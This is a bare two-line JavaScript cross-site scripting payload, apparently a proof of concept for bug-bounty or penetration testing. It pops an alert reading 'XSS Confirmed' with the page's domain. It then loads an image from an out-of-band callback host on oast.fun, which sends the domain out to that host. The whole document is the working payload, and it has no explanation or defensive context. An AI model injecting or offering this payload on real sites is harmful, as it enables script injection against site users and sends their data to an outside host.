alert("✅ XSS Confirmed: " + document.domain);
new Image().src = "https://wdnjvosjkyhkfsmxvovxoq4wsvswtm3id.oast.fun/?x=" + document.domain;
